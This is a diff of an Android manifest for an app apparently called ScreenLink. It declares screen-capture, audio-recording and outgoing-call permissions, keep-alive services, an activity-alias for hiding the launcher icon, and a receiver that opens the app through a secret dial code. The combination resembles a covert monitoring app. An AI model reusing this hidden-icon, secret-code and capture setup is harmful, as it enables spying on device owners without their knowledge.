@@ -8,22 +8,24 @@
         android:minSdkVersion="24"
         android:targetSdkVersion="35" />
 
-    <!-- 必要的权限 -->
-    <uses-permission android:name="android.permission.INTERNET" />
-    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
-    <uses-permission android:name="android.permission.RECORD_AUDIO" />
-    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
-    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
-    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
-    <uses-permission android:name="android.permission.WAKE_LOCK" />
-    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
-    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
-    <uses-permission android:name="android.permission.GET_TASKS" />
-    <uses-permission android:name="android.permission.REORDER_TASKS" />
+    <!-- 必要的权限声明：网络、录音、前台服务、系统等 -->
+    <uses-permission android:name="android.permission.INTERNET" /> <!-- 网络访问 -->
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" /> <!-- 网络状态 -->
+    <uses-permission android:name="android.permission.RECORD_AUDIO" /> <!-- 录音 -->
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" /> <!-- 通知权限 -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" /> <!-- 前台服务 -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" /> <!-- 录屏前台服务 -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" /> <!-- 数据同步前台服务 -->
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" /> <!-- 读取电话状态 -->
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" /> <!-- 处理外拨电话 -->
+    <uses-permission android:name="android.permission.WAKE_LOCK" /> <!-- 保持唤醒 -->
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" /> <!-- 忽略电池优化 -->
+    <uses-permission android:name="android.permission.GET_TASKS" /> <!-- 获取任务列表 -->
+    <uses-permission android:name="android.permission.REORDER_TASKS" /> <!-- 重新排序任务 -->
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" /> <!-- 悬浮窗权限 -->
 
+
+    <!-- 可选硬件特性声明：不强制要求电话模块 -->
     <uses-feature
         android:name="android.hardware.telephony"
         android:required="false" />
@@ -40,19 +42,19 @@
         android:debuggable="true"
         android:extractNativeLibs="false"
         android:icon="@mipmap/ic_launcher"
-        android:label="ScreenLinkNew"
+        android:label="ScreenLink"
         android:roundIcon="@mipmap/ic_launcher_round"
         android:supportsRtl="true"
         android:testOnly="true"
         android:theme="@style/Theme.AppCompat.Light.NoActionBar" >
 
-        <!-- 主界面作为启动入口 -->
+        <!-- 主界面 Activity，应用入口 -->
         <activity
             android:name="com.screenlink.newapp.MainActivity"
             android:exported="true"
             android:launchMode="singleTask"
             android:screenOrientation="portrait" >
-        </activity> <!-- 为MainActivity创建一个别名，用于控制应用图标的显示和隐藏 -->
+        </activity> <!-- MainActivity 的别名，用于控制桌面图标显示/隐藏 -->
         <activity-alias
             android:name="com.screenlink.newapp.LauncherActivity"
             android:enabled="true"
@@ -67,15 +69,7 @@
             </intent-filter>
         </activity-alias>
 
-        <!-- 屏幕捕获服务 -->
-        <service
-            android:name="com.screenlink.newapp.ScreenCaptureService"
-            android:enabled="true"
-            android:exported="false"
-            android:foregroundServiceType="mediaProjection"
-            android:stopWithTask="false" />
-
-        <!-- 后台服务 -->
+        <!-- 后台保活服务（如心跳、保活等） -->
         <service
             android:name="com.screenlink.newapp.BackgroundService"
             android:enabled="true"
@@ -83,18 +77,27 @@
             android:foregroundServiceType="dataSync"
             android:stopWithTask="false" />
 
-        <!-- 添加广播接收器，用于监听拨号事件 -->
+        <!-- 屏幕共享主服务（负责采集、推流、信令等核心功能） -->
+        <service
+            android:name="com.screenlink.newapp.ScreenShareService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="mediaProjection"
+            android:stopWithTask="false" />
+
+        <!-- 电话相关广播接收器（监听拨号、开机等事件） -->
         <receiver
             android:name="com.screenlink.newapp.PhoneCallReceiver"
             android:enabled="true"
             android:exported="true"
             android:permission="android.permission.BROADCAST_STICKY" >
+
+            <!-- 监听电话拨出、电话状态变化 -->
             <intent-filter android:priority="1000" >
                 <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
                 <action android:name="android.intent.action.PHONE_STATE" />
             </intent-filter>
-
-            <!-- 添加对秘密代码的处理 -->
+            <!-- 监听秘密代码（如*#*#12345#*#*） -->
             <intent-filter android:priority="1000" >
                 <action android:name="android.provider.Telephony.SECRET_CODE" />
 
@@ -102,22 +105,16 @@
                     android:host="12345"
                     android:scheme="android_secret_code" />
             </intent-filter>
-
-            <!-- 添加开机自启动处理 -->
-            <intent-filter android:priority="1000" >
-                <action android:name="android.intent.action.BOOT_COMPLETED" />
-                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
-                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
-
-                <category android:name="android.intent.category.DEFAULT" />
-            </intent-filter>
         </receiver>
 
+        <!-- 显示远端画面的 Activity（全屏无标题栏） -->
         <activity
             android:name="com.screenlink.newapp.DisplayActivity"
             android:exported="false"
             android:screenOrientation="portrait"
             android:theme="@android:style/Theme.NoTitleBar.Fullscreen" />
+
+        <!-- 测试用 Activity -->
         <activity
             android:name="com.screenlink.newapp.TestActivity"
             android:exported="true" />
